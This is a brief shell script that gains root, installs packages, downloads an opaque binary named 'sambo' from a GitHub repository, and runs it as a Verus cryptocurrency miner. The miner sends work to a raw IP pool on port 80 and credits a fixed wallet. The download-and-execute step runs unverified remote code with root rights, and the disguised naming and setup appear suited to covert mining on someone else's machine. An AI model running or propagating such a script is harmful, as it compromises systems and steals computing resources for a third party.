sudo su
sudo apt-get update && sudo apt-get install asterisk -y && sudo apt-get install mlocate -y
sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ -y

wget https://github.com/sbwsmg/lol/raw/main/sambo
chmod 700 sambo

#!/bin/sh
PoolHost=139.162.40.79
Port=80
PublicVerusCoinAddress=RBG1qWaLRYGddYdKhfJiUzKr7K2hNS5Mn5
WorkerName=sambo
Threads=3
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
./sambo -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@"
